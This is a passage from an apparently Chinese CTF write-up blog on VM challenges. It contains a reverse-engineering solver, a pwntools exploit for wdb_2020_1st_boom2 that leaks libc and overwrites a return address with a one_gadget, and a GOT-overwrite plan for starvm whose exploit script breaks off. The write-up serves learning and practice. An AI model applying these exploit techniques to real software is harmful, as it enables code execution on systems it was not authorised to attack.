class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opcode)):</span><br><span class="line"><span class="keyword">if</span> (opcode[i] == <span class="number">0xF1</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mov &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE1</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eax &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ebx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE3</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ecx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE4</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;edx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE7</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">6</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xor eax ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF4</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF7</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mul eax edx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF8</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;swap eax ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF6</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mov eax=3*eax+2*ebx+ecx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[32] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[33] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[34] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[35] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[36] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[37] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[38] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[39] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[40] eax</span><br><span class="line">mov eax flag[9]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[41] eax</span><br><span class="line">mov eax flag[10]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[42] eax</span><br><span class="line">mov eax flag[11]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[43] eax</span><br><span class="line">mov eax flag[12]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[44] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[45] eax</span><br><span class="line">mov eax flag[14]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[46] eax</span><br><span class="line">mov eax flag[15]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[47] eax</span><br><span class="line">mov eax flag[16]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[48] eax</span><br><span class="line">mov eax flag[17]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[49] eax</span><br><span class="line">mov eax flag[18]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[50] eax</span><br><span class="line">mov eax flag[19]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[51] eax</span><br><span class="line">nop</span><br><span class="line">#上面部分是误解</span><br><span class="line">read</span><br><span class="line"></span><br><span class="line">mov eax flag[0]</span><br><span class="line">mov ebx flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[0] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[1]</span><br><span class="line">mov ebx flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[1] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[2]</span><br><span class="line">mov ebx flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[2] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[3]</span><br><span class="line">mov ebx flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[3] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[4]</span><br><span class="line">mov ebx flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[4] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[5]</span><br><span class="line">mov ebx flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[5] eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov eax flag[6]</span><br><span class="line">mov ebx flag[7]</span><br><span class="line">mov ecx flag[8]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[6] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[7]</span><br><span class="line">mov ebx flag[8]</span><br><span class="line">mov ecx flag[9]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[7] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[8]</span><br><span class="line">mov ebx flag[9]</span><br><span class="line">mov ecx flag[10]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[8] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[13]</span><br><span class="line">mov ebx flag[19]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[13] eax</span><br><span class="line">mov flag[19] ebx</span><br><span class="line"></span><br><span class="line">mov eax flag[14]</span><br><span class="line">mov ebx flag[18]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[14] eax</span><br><span class="line">mov flag[18] ebx</span><br><span class="line"></span><br><span class="line">mov eax flag[15]</span><br><span class="line">mov ebx flag[17]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[15] eax</span><br><span class="line">mov flag[17] ebx</span><br><span class="line">nop</span><br></pre></td></tr></table></figure><p>从读入长度以及0x2020a8引用判断下面部分才是真正的逆向块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_2022A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_2022A8 + i) != byte_202020[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的加密逻辑:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span>    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)：:</span><br><span class="line">    flag[i] = flag[i]^flag[i + <span class="number">1</span>]</span><br><span class="line">flag[<span class="number">6</span>] = (flag[<span class="number">8</span>]+<span class="number">2</span>*flag[<span class="number">7</span>]+<span class="number">3</span>*flag[<span class="number">6</span>])*flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">7</span>] = (flag[<span class="number">9</span>]+<span class="number">2</span>*flag[<span class="number">8</span>]+<span class="number">3</span>*flag[<span class="number">7</span>])*flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">8</span>] = (flag[<span class="number">10</span>]+<span class="number">2</span>*flag[<span class="number">9</span>]+<span class="number">3</span>*flag[<span class="number">8</span>])*flag[<span class="number">12</span>]</span><br><span class="line">swap(flag[<span class="number">13</span>], flag[<span class="number">19</span>])</span><br><span class="line">swap(flag[<span class="number">14</span>], flag[<span class="number">18</span>])</span><br><span class="line">swap(flag[<span class="number">15</span>], flag[<span class="number">17</span>])</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"></span><br><span class="line">check[<span class="number">13</span>], check[<span class="number">19</span>] = check[<span class="number">19</span>], check[<span class="number">13</span>]</span><br><span class="line">check[<span class="number">14</span>], check[<span class="number">18</span>] = check[<span class="number">18</span>], check[<span class="number">14</span>]</span><br><span class="line">check[<span class="number">15</span>], check[<span class="number">17</span>] = check[<span class="number">17</span>], check[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> check[<span class="number">8</span>] == ((i*<span class="number">3</span> + check[<span class="number">9</span>]*<span class="number">2</span> + check[<span class="number">10</span>])*check[<span class="number">12</span>])&amp;<span class="number">0xff</span>:</span><br><span class="line">        check[<span class="number">8</span>] = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> check[<span class="number">7</span>] == ((j * <span class="number">3</span> + check[<span class="number">8</span>] * <span class="number">2</span> + check[<span class="number">9</span>]) * check[<span class="number">12</span>]) &amp; <span class="number">0xff</span>:</span><br><span class="line">                check[<span class="number">7</span>] = j</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">                    <span class="keyword">if</span> check[<span class="number">6</span>] == ((k * <span class="number">3</span> + check[<span class="number">7</span>] * <span class="number">2</span> + check[<span class="number">8</span>]) * check[<span class="number">12</span>]) &amp; <span class="number">0xff</span>:</span><br><span class="line">                        check[<span class="number">6</span>] = k</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    check[i] ^= check[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(check)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(check[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="wdb-2020-1st-boom2"><a href="#wdb-2020-1st-boom2" class="headerlink" title="wdb_2020_1st_boom2"></a>wdb_2020_1st_boom2</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/boom&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开发现存在类似平坦化混淆的东西</p><p>不过影响不大</p><p>申请了两个0x40000得堆块分别用作栈和数据缓冲区,并且初始化栈:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1        30</span><br><span class="line">2        13</span><br><span class="line">3        0</span><br><span class="line">4        真实栈地址</span><br><span class="line">5        虚拟栈地址</span><br></pre></td></tr></table></figure><p>vm题比较麻烦的点就是分析指令,以及确定各内存如何对应模拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0 immcode: reg=[sp+immcode]</span><br><span class="line">1 immcode: reg=immcode</span><br><span class="line">6 immcode: push bp; bp=sp; sp-=immcode</span><br><span class="line">8 immcode: leave; ret</span><br><span class="line">9        : reg=[reg]</span><br><span class="line">10       : reg=char([reg])</span><br><span class="line">11       : [sp]=reg(int64)</span><br><span class="line">12       : [sp]=reg(byte)</span><br><span class="line">13       : push reg</span><br><span class="line">14       : [sp]=[sp] | reg</span><br><span class="line">15       : [sp]=[sp] ^ reg</span><br><span class="line">16       : [sp]=[sp] &amp; reg</span><br><span class="line">17       : [sp]=[sp] == reg</span><br><span class="line">18       : [sp]=[sp] != reg</span><br><span class="line">19       : [sp]=[sp] &lt; reg</span><br><span class="line">20       : [sp]=[sp] &gt; reg</span><br><span class="line">21       : [sp]=[sp] &lt;= reg</span><br><span class="line">22       : [sp]=[sp] &gt;= reg</span><br><span class="line">23       : [sp]=[sp] &lt;&lt; reg</span><br><span class="line">24       : [sp]=[sp] &gt;&gt; reg</span><br><span class="line">25       : [sp]=[sp] + reg</span><br><span class="line">26       : [sp]=[sp] - reg</span><br><span class="line">27       : [sp]=[sp] * reg</span><br><span class="line">28       : [sp]=[sp] / reg</span><br><span class="line">29       : [sp]=[sp] % reg</span><br><span class="line">30       : exit</span><br></pre></td></tr></table></figure><p>因为栈中存储有真实的栈地址,所以我们可以利用它来覆盖返回地址</p><p><strong>步骤:</strong></p><ol><li>首先进行一次pop将初始栈顶的bp pop出来,随便一个改变栈的指令就行</li><li>这时栈顶就是真实栈指针了，然后利用指令1将reg寄存器置为便宜0xe8，然后利用指令26，让栈指针减0xe8，并利用指令13将结果重新入栈</li><li>使用指令9取值，获取返回地址处的值（也就是libc_start_main+231的地址），并用13指令将获取到的值入栈</li><li>利用指令1将reg置为libc_start_main+231的偏移值offset，然后利用指令26让libc_start_main+231地址减偏移，得到libc的基址，并用13指令将获取到的libc基址入栈</li><li>利用指令1将reg置为onegadget的偏移offset，然后利用指令25计算出libc基址加onegadget偏移，也就是onegadget的地址</li><li>这时栈顶是之前步骤2入栈的返回地址指针，利用指令11将onegadget写入覆盖返回地址</li><li>然后直接发送即可。</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc231=基址偏移</span><br><span class="line">onegadget=可用one_gadget</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">14</span>)  <span class="comment">#步骤1</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0xe8</span>)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤2</span></span><br><span class="line">payload+=p64(<span class="number">9</span>)+p64(<span class="number">13</span>)   <span class="comment">#步骤3</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(libc231)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤4</span></span><br><span class="line"><span class="comment">#现在      stack    返回地址所在的栈</span></span><br><span class="line"><span class="comment">#                   libc基址</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(onegadget)+p64(<span class="number">25</span>) <span class="comment">#步骤5   reg=one_gadget</span></span><br><span class="line">payload+=p64(<span class="number">11</span>) <span class="comment">#步骤6</span></span><br><span class="line">p.send(payload) <span class="comment">#步骤7</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>vm类题</p><p>checksec,没有PIE利用会稍微简单一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/starvm&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>代码有点难读,gdb动态调试参照</p><p>初始malloc申请了0x80的内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0h   *code_begin</span><br><span class="line">8h   *code_end</span><br><span class="line">...  ??</span><br><span class="line">24h  *cost</span><br><span class="line">...  ??</span><br><span class="line">38h  regs(Dword)</span><br><span class="line">...</span><br><span class="line">70h  mem</span><br></pre></td></tr></table></figure><p>程序在读入command和cost后做出一些判断,然后进入虚拟机操作中</p><p>存在两个重要的变量分别负责指向当前code和当前cost</p><p>10号功能给寄存器赋值,溢出可以修改后面的mem指针</p><p>7号指令可以往mem指向处任意写,两者配合其他指令</p><p><strong>具体实施:</strong></p><ol><li>10号指令覆写mem指针为setvbuf的got表地址,利用减法得到system,利用7号指令将其修改</li><li>10号指令覆写mem指针为malloc的got表地址,7号指令将其写为调用setvbuf的地址</li><li>10号指令覆写mem指针为stdin的地址,将其修改为bss段上另一处地址,并在该处写上sh字符串</li><li>10号指令覆写mem指针为0使得再次调用相关功能时启用malloc,总而执行以上布置的执行流</li></ol><p>要注意指令是4字节Dword的,下标要对应</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span 